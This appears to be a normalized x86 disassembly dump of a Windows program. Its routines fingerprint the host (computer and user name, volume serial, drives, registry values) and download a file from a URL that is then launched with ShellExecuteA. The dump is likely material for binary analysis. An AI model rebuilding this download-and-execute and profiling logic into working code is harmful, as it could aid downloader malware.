mov eax [ eax - 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x6
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d410
call sub_3a64c34
pop ecx
pop ecx
pop ebp
retn
sub_3af195c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x1c ] eax
mov ebx [ ebp - 0x4 ]
xor edi edi
mov [ ebp - 0x8 ] esp
mov eax [ ebp - 0xc ]
inc eax
shl eax 0x2
sub esp eax
lea eax [ ebp - 0x10 ]
mov [ eax ] esp
mov eax [ ebp - 0xc ]
sub eax edi
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x18 ]
mov [ edx + eax * 4 ] ecx
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
jmp r-xdata
mov eax ebx
call sub_3a6a120
mov esi eax
push 0x0
push 0x0
push esi
push ebx
push 0x0
push 0x0
call MultiByteToWideChar
inc eax
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
add eax eax
add eax 0x3
and eax 0xfffffffc
sub esp eax
lea eax [ ebp - 0x18 ]
mov [ eax ] esp
test edi edi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
call GetThreadLocale
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
cmp eax 0x80020006
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push esi
push ebx
push 0x0
push 0x0
call MultiByteToWideChar
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
mov [ eax + edx * 2 - 0x2 ] 0x0
inc esi
add ebx esi
inc edi
cmp edi [ ebp - 0xc ]
jne r-xdata
call sub_3af13d8
push ebp
call sub_3af1928
pop ecx
jmp r-xdata
mov esp [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_3af1a54
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
mov ebx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ ebx + 0x1 ] 0x40
jbe r-xdata
movzx edx [ eax ]
cmp dx 0x9
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d3d4
call sub_3a64c34
cmp dx 0x4009
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
call sub_3af1a3c
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
lea eax [ ebp - 0x104 ]
push eax
movzx ecx [ ebx + 0x2 ]
inc ecx
movzx eax [ ebx + 0x1 ]
lea edx [ ebx + eax + 0x3 ]
mov eax [ ebp - 0x4 ]
call sub_3af195c
test esi esi
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
push esi
lea ecx [ ebp - 0x104 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3af15ec
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_3a70c58
sub_3af1af0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov ebx edx
xor edx edx
push ebp
push sub_3af1bb5
push [ fs : edx ]
mov [ fs : edx ] esp
cmp eax 0x80020009
jne r-xdata
push eax
push 0x0
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_3af1250
mov esi eax
mov eax [ ebx + 0x1c ]
push eax
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x4 ]
call sub_3a65528
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0xc ]
call sub_3a65528
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
lea eax [ ebp - 0x10 ]
mov edx [ ebx + 0x8 ]
call sub_3a65528
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3af1324
mov esi eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax esi
call sub_3a64c34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af1bbc
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_3a652c4
retn
push [ ebp - 0x4 ]
mov eax esi
jmp sub_3a64c34
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_3a65f24
jmp r-xdata
sub_3af1be0
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
xor edx edx
mov edi esp
movzx ecx [ ebx + 0x1 ]
mov [ ebp - 0x8 ] ecx
test ecx ecx
je r-xdata
mov [ ebp - 0x10 ] esp
movzx eax [ ebx + 0x2 ]
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
add ebx 0x3
mov esi [ ebp + 0x18 ]
movzx ecx [ ebx ]
cmp ecx 0x4
jne r-xdata
mov esi [ ebp + 0x14 ]
and al 0x7f
or eax 0x4000
cmp al 0xc
je r-xdata
mov [ ebp - 0xc ] esp
push edx
lea eax [ ebp - 0x30 ]
push eax
push ecx
push edx
call sub_3af1bd0
pop edx
pop ecx
push [ ebp + 0x1c ]
lea eax [ ebp - 0x10 ]
push eax
push ecx
push edx
push rw-data
push [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
test eax eax
je r-xdata
push 0xfffffffd
inc [ ebp - 0x4 ]
cmp [ ebx + 0x3 ] 0x9
je r-xdata
push [ esi + eax * 4 - 0x4 ]
dec eax
jne r-xdata
movzx eax [ ebx ]
test al 0x80
jne r-xdata
mov ebx [ ebp + 0xc ]
push [ esi + 0xc ]
push [ esi + 0x8 ]
push [ esi + 0x4 ]
push [ esi ]
add esi 0x10
jmp r-xdata
cmp al 0x5
jb r-xdata
mov esp edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
lea edx [ ebp - 0x30 ]
mov cl 0x1
push ecx
mov ecx [ ebp + 0x4 ]
jmp sub_3af1af0
mov ecx 0x8
cmp [ ebx + 0x3 ] 0xd
jne r-xdata
inc ebx
dec ecx
jne r-xdata
push edx
push [ esi ]
push edx
push eax
add esi 0x4
cmp al 0x7
ja r-xdata
push [ esi + 0x4 ]
push [ esi ]
push edx
push eax
add esi 0x8
jmp r-xdata
sub_3af1cc4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
xor eax eax
push eax
push eax
push eax
push eax
mov eax esp
push eax
lea eax [ ebp + 0x14 ]
push eax
push eax
push [ ebx ]
lea eax [ ebx + 0x5 ]
push eax
push [ ebp + 0xc ]
call sub_3af1be0
movzx eax [ ebx + 0x4 ]
mov ebx [ ebp + 0x8 ]
jmp [ eax * 4 + jump_table_3af1cf5 ]
fld [ esp + 0x8 ]
jmp r-xdata
fld [ esp + 0x8 ]
jmp r-xdata
fild [ esp + 0x8 ]
jmp r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax ebx
call sub_3a70c58
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0x8 ]
add esp 0x10
pop ebx
pop ebp
retn
mov eax [ esp + 0x8 ]
mov [ ebx ] eax
jmp r-xdata
push eax
call SysFreeString
mov eax [ esp + 0x8 ]
mov [ ebx ] eax
jmp r-xdata
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
sub_3af1da0
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0xffffffff
je r-xdata
call [ rw-data ]
push 0x0
call CoInitialize
test eax 0x80000000
sete al
mov [ rw-data ] al
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
push 0x0
call [ rw-data ]
test eax 0x80000000
sete al
mov [ rw-data ] al
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov al 0x1
test [ rw-data ] 0x2
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ rw-data ]
mov [ edx ] al
retn
sub_3af1e1c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_3af1e92
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af1e99
retn
mov [ rw-data ] 0x1
mov eax [ rw-data ]
call sub_3a64380
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
mov ecx 0x5
mov edx [ r-xdata ]
call sub_3a65e38
call CoUninitialize
sub_3af1ea4
push ebx
add esp 0xfffffef4
mov ebx eax
push esp
push 0x0
push 0x0
push 0x1c
push 0x0
call SHGetFolderPathA
mov eax ebx
mov edx esp
mov ecx 0x105
call sub_3a65510
mov eax [ ebx ]
mov [ esp + 0x108 ] eax
mov eax [ esp + 0x108 ]
test eax eax
je r-xdata
mov edx [ ebx ]
cmp [ edx + eax - 0x1 ] 0x5c
je r-xdata
sub eax 0x4
mov eax [ eax ]
add esp 0x10c
pop ebx
retn
mov eax ebx
mov edx r-xdata
call sub_3a6556c
sub_3af1f0c
push ebx
add esp 0xfffffef4
mov ebx eax
push esp
push 0x0
push 0x0
push 0x0
push 0x0
call SHGetFolderPathA
mov eax ebx
mov edx esp
mov ecx 0x105
call sub_3a65510
mov eax [ ebx ]
mov [ esp + 0x108 ] eax
mov eax [ esp + 0x108 ]
test eax eax
je r-xdata
mov edx [ ebx ]
cmp [ edx + eax - 0x1 ] 0x5c
je r-xdata
sub eax 0x4
mov eax [ eax ]
add esp 0x10c
pop ebx
retn
mov eax ebx
mov edx r-xdata
call sub_3a6556c
sub_3af1f74
push ebx
add esp 0xfffffef4
mov ebx eax
push esp
push 0x0
push 0x0
push 0x5
push 0x0
call SHGetFolderPathA
mov eax ebx
mov edx esp
mov ecx 0x105
call sub_3a65510
mov eax [ ebx ]
mov [ esp + 0x108 ] eax
mov eax [ esp + 0x108 ]
test eax eax
je r-xdata
mov edx [ ebx ]
cmp [ edx + eax - 0x1 ] 0x5c
je r-xdata
sub eax 0x4
mov eax [ eax ]
add esp 0x10c
pop ebx
retn
mov eax ebx
mov edx r-xdata
call sub_3a6556c
sub_3af1fdc
push ebp
mov ebp esp
add esp 0xfffffe2c
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_3a65720
mov eax [ ebp - 0x8 ]
call sub_3a65720
xor eax eax
push ebp
push sub_3af20b5
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_3af2062
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x1d4 ]
call sub_3a6372c
mov eax [ ebp - 0x4 ]
call sub_3a69da8
test al al
jne r-xdata
lea eax [ ebp - 0x1d4 ]
call sub_3a634c8
call sub_3a6303c
lea eax [ ebp - 0x1d4 ]
call sub_3a634bc
call sub_3a6303c
jmp r-xdata
test bl bl
je r-xdata
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af20bc
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_3a652c4
retn
mov edx [ ebp - 0x8 ]
lea eax [ ebp - 0x1d4 ]
call sub_3a65a24
call sub_3a63ddc
call sub_3a6303c
lea eax [ ebp - 0x1d4 ]
call sub_3a638ac
call sub_3a6303c
sub_3af20c8
push ebx
push ecx
mov ebx eax
mov eax ebx
mov edx 0x104
call sub_3a659c0
mov eax [ ebx ]
call sub_3a65730
push eax
push 0x104
call GetTempPathA
test al al
je r-xdata
pop edx
pop ebx
retn
movzx edx al
mov eax ebx
call sub_3a659c0
mov eax [ ebx ]
mov [ esp ] eax
mov eax [ esp ]
test eax eax
je r-xdata
mov edx [ ebx ]
cmp [ edx + eax - 0x1 ] 0x5c
je r-xdata
sub eax 0x4
mov eax [ eax ]
mov eax ebx
mov edx r-xdata
call sub_3a6556c
sub_3af2130
push ebx
push esi
mov esi edx
mov ebx eax
push r-xdata
push r-xdata
call LoadLibraryA
push eax
call GetProcAddress
push esi
push ebx
call eax
pop esi
pop ebx
retn
sub_3af2178
push ebx
push esi
mov esi edx
mov ebx eax
push r-xdata
push r-xdata
call LoadLibraryA
push eax
call GetProcAddress
push esi
push ebx
call eax
pop esi
pop ebx
retn
sub_3af21c4
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
xor edx edx
mov [ ebp - 0x10c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_3af2237
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x105 ]
mov edx 0x105
call sub_3af2178
lea eax [ ebp - 0x10c ]
lea edx [ ebp - 0x105 ]
mov ecx 0x105
call sub_3a65510
mov edx [ ebp - 0x10c ]
mov eax ebx
mov ecx r-xdata
call sub_3a655b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af223e
lea eax [ ebp - 0x10c ]
call sub_3a652a0
retn
sub_3af2250
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_3af2297
push [ fs : eax ]
mov [ fs : eax ] esp
push ebx
lea eax [ ebp - 0x4 ]
call sub_3af21c4
mov eax [ ebp - 0x4 ]
mov ecx 0x3
mov edx 0x1
call sub_3a65798
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af229e
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3af22a4
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
xor edx edx
mov [ ebp - 0x10c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_3af2317
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x105 ]
mov edx 0x105
call sub_3af2130
lea eax [ ebp - 0x10c ]
lea edx [ ebp - 0x105 ]
mov ecx 0x105
call sub_3a65510
mov edx [ ebp - 0x10c ]
mov eax ebx
mov ecx r-xdata
call sub_3a655b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af231e
lea eax [ ebp - 0x10c ]
call sub_3a652a0
retn
sub_3af2330
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_3af23b7
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_3a633b0
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_3a65338
mov eax esi
call sub_3a652a0
mov eax ebx
call sub_3a633d8
mov edx [ ebp - 0x4 ]
movzx edx [ edx + eax ]
lea eax [ ebp - 0x8 ]
call sub_3a65488
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_3a6556c
mov eax [ esi ]
call sub_3a65560
cmp edi eax
jne r-xdata
sub ebx 0x4
mov ebx [ ebx ]
mov ebx [ ebp - 0x4 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af23be
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_3a652c4
retn
sub_3af2408
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push r-xdata
push r-xdata
call LoadLibraryA
push eax
call GetProcAddress
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp + 0xc ]
push edx
mov edx [ ebp + 0x10 ]
push edx
push edi
push esi
push ebx
call eax
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_3af2460
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_3a65720
xor eax eax
push ebp
push sub_3af2512
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a69f5c
inc eax
jne r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a69f5c
inc eax
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a69f5c
inc eax
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a69f5c
inc eax
je r-xdata
push ebx
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a69f5c
mov ecx eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_3a65798
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af2519
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
push ebx
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a69f5c
mov ecx eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_3a65798
sub_3af2538
push ebp
mov ebp esp
mov ecx 0x3f
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_3af27e2
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x1d4 ]
call sub_3af20c8
push [ ebp - 0x1d4 ]
lea edx [ ebp - 0x1d8 ]
mov eax 0x6
call sub_3af2330
push [ ebp - 0x1d8 ]
push r-xdata
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_3a65634
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x1d0 ]
call sub_3a6372c
lea eax [ ebp - 0x1d0 ]
call sub_3a634bc
call sub_3a6303c
mov edx r-xdata
lea eax [ ebp - 0x1d0 ]
call sub_3a65a24
call sub_3a63ddc
call sub_3a6303c
push r-xdata
push [ ebx ]
push r-xdata
push r-xdata
lea eax [ ebp - 0x1dc ]
mov edx 0x4
call sub_3a65634
mov edx [ ebp - 0x1dc ]
lea eax [ ebp - 0x1d0 ]
call sub_3a65a24
call sub_3a63ddc
call sub_3a6303c
mov edx r-xdata
lea eax [ ebp - 0x1d0 ]
call sub_3a65a24
call sub_3a63ddc
call sub_3a6303c
push r-xdata
push [ ebx ]
push r-xdata
push r-xdata
lea eax [ ebp - 0x1e0 ]
mov edx 0x4
call sub_3a65634
mov edx [ ebp - 0x1e0 ]
lea eax [ ebp - 0x1d0 ]
call sub_3a65a24
call sub_3a63ddc
call sub_3a6303c
push r-xdata
push [ esi ]
push r-xdata
lea eax [ ebp - 0x1e4 ]
mov edx 0x3
call sub_3a65634
mov edx [ ebp - 0x1e4 ]
lea eax [ ebp - 0x1d0 ]
call sub_3a65a24
call sub_3a63ddc
call sub_3a6303c
mov edx r-xdata
lea eax [ ebp - 0x1d0 ]
call sub_3a65a24
call sub_3a63ddc
call sub_3a6303c
lea eax [ ebp - 0x1d0 ]
call sub_3a638ac
call sub_3a6303c
push 0x7d0
call Sleep
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
lea eax [ ebp - 0x1e8 ]
mov edx 0x3
call sub_3a65634
mov eax [ ebp - 0x1e8 ]
call sub_3a65730
push eax
lea edx [ ebp - 0x1ec ]
mov eax [ ebp - 0x4 ]
call sub_3af2460
mov eax [ ebp - 0x1ec ]
call sub_3a65730
push eax
push 0x0
lea eax [ ebp - 0x1f0 ]
call sub_3af22a4
lea eax [ ebp - 0x1f0 ]
mov edx r-xdata
call sub_3a6556c
mov eax [ ebp - 0x1f0 ]
call sub_3a65730
mov ecx eax
mov edx r-xdata
xor eax eax
call sub_3af2408
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
lea eax [ ebp - 0x1f4 ]
mov edx 0x3
call sub_3a65634
mov eax [ ebp - 0x1f4 ]
call sub_3a65730
push eax
lea edx [ ebp - 0x1f8 ]
mov eax [ ebp - 0x4 ]
call sub_3af2460
mov eax [ ebp - 0x1f8 ]
call sub_3a65730
push eax
push 0x0
lea eax [ ebp - 0x1fc ]
call sub_3af21c4
lea eax [ ebp - 0x1fc ]
mov edx r-xdata
call sub_3a6556c
mov eax [ ebp - 0x1fc ]
call sub_3a65730
mov ecx eax
mov edx r-xdata
xor eax eax
call sub_3af2408
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af27e9
lea eax [ ebp - 0x1fc ]
mov edx 0xb
call sub_3a652c4
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3af2974
push ebp
mov ebp esp
add esp 0xfffffa9c
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x564 ] ecx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
lea esi [ ebp - 0x14 ]
xor eax eax
push ebp
push sub_3af2ad9
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x564 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_3acfc84
mov eax [ ebp - 0x564 ]
lea edx [ ebp - 0x4 ]
call sub_3a69fe4
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_3a65730
push eax
call InternetOpenA
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_3af2ab1
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_3a65730
push eax
mov eax [ ebp - 0xc ]
push eax
call InternetOpenUrlA
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_3af2a93
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx edi
lea eax [ ebp - 0x560 ]
call sub_3a6372c
mov edx 0x1
lea eax [ ebp - 0x560 ]
call sub_3a63be8
call sub_3a6303c
push esi
push 0x400
lea eax [ ebp - 0x414 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call InternetReadFile
push 0x0
lea edx [ ebp - 0x414 ]
mov ecx [ esi ]
lea eax [ ebp - 0x560 ]
call sub_3a6388c
call sub_3a6303c
cmp [ esi ] 0x0
jne r-xdata
lea eax [ ebp - 0x560 ]
call sub_3a638ac
call sub_3a6303c
mov [ ebp - 0x5 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af2a9a
mov eax [ ebp - 0x10 ]
push eax
call InternetCloseHandle
retn
sub_3af2aec
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
call sub_3a65720
mov eax [ ebp + 0xc ]
call sub_3a65720
xor eax eax
push ebp
push sub_3af2b57
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
call sub_3af2974
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af2b5e
lea eax [ ebp + 0x8 ]
mov edx 0x2
call sub_3a652c4
retn
push 0x1
push 0x0
push 0x0
mov eax [ ebp + 0xc ]
call sub_3a65730
push eax
push r-xdata
push 0x0
call ShellExecuteA
mov ebx eax
sub_3af2b70
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push sub_3af2bec
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_3a652a0
mov eax 0x200
call sub_3a62ee0
mov ebx eax
push ebx
push 0x200
call GetLogicalDriveStringsA
push 0x1
call SetErrorMode
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
push [ esi ]
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_3a65498
push [ ebp - 0x4 ]
push r-xdata
mov eax esi
mov edx 0x3
call sub_3a65634
add ebx 0x4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af2bf3
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3af2c04
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_3a65720
xor eax eax
push ebp
push sub_3af2c7a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_3a652a0
push 0x0
push 0x0
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0xc
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_3a65730
push eax
call GetVolumeInformationA
mov eax [ ebp - 0x8 ]
xor edx edx
push edx
push eax
mov edx ebx
mov eax 0x8
call sub_3a699a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af2c81
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3af2c88
push ebx
push esi
push edi
push ebp
push ecx
xor ebx ebx
push r-xdata
call LoadLibraryA
mov ebp eax
test ebp ebp
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
push r-xdata
push ebp
call GetProcAddress
mov edi eax
mov esi edi
test edi edi
je r-xdata
push ebp
call FreeLibrary
xor eax eax
mov [ esp ] eax
push esp
call GetCurrentProcess
push eax
call esi
test eax eax
je r-xdata
cmp [ esp ] 0x1
sbb ebx ebx
inc ebx
sub_3af2cfc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_3a65720
mov eax [ ebp - 0x8 ]
call sub_3a65720
mov eax [ ebp + 0xc ]
call sub_3a65720
xor eax eax
push ebp
push sub_3af2ddb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ ebp + 0xc ]
call sub_3a652f4
lea eax [ ebp - 0xc ]
push eax
push 0x1
push 0x0
mov eax [ ebp - 0x4 ]
call sub_3a65730
push eax
push esi
call RegOpenKeyExA
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af2de2
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_3a652c4
lea eax [ ebp + 0xc ]
call sub_3a652a0
retn
lea eax [ ebp - 0x14 ]
push eax
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov eax [ ebp - 0x8 ]
call sub_3a65730
mov esi eax
push esi
mov eax [ ebp - 0xc ]
push eax
call RegQueryValueExA
test eax eax
jne r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegCloseKey
mov eax ebx
mov edx [ ebp - 0x14 ]
call sub_3a659c0
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebx ]
call sub_3a65730
push eax
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call RegQueryValueExA
mov edx [ ebp - 0x14 ]
dec edx
mov eax ebx
call sub_3a659c0
sub_3af2dec
push ebx
mov ebx eax
call sub_3af2c88
test al al
je r-xdata
mov eax ebx
mov edx r-xdata
call sub_3a652f4
pop ebx
retn
mov eax ebx
mov edx r-xdata
call sub_3a652f4
pop ebx
retn
sub_3af2e34
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_3af2e95
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push ebx
mov ecx r-xdata
mov edx r-xdata
mov eax 0x80000002
call sub_3af2cfc
push [ ebx ]
push r-xdata
lea eax [ ebp - 0x4 ]
call sub_3af2dec
push [ ebp - 0x4 ]
mov eax ebx
mov edx 0x3
call sub_3a65634
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af2e9c
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3af2ef8
push ebx
add esp 0xfffffefc
mov ebx eax
mov [ esp ] 0x100
push esp
lea eax [ esp + 0x8 ]
push eax
call GetComputerNameA
test eax eax
je r-xdata
add esp 0x104
pop ebx
retn
mov eax ebx
lea edx [ esp + 0x4 ]
mov ecx 0x100
call sub_3a65510
sub_3af2f30
push ebx
add esp 0xfffffefc
mov ebx eax
mov [ esp ] 0x100
push esp
lea eax [ esp + 0x8 ]
push eax
call GetUserNameA
test eax eax
je r-xdata
add esp 0x104
pop ebx
retn
mov eax ebx
lea edx [ esp + 0x4 ]
mov ecx 0x100
call sub_3a65510
sub_3af2f68
push ebp
mov ebp esp
add esp 0xfffffe98
xor ecx ecx
mov [ ebp - 0x168 ] ecx
mov [ ebp - 0x164 ] ecx
mov [ ebp - 0x160 ] ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_3a65720
xor eax eax
push ebp
push sub_3af30d0
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x14 ]
call sub_3a652a0
xor eax eax
push ebp
push sub_3af3088
push [ fs : eax ]
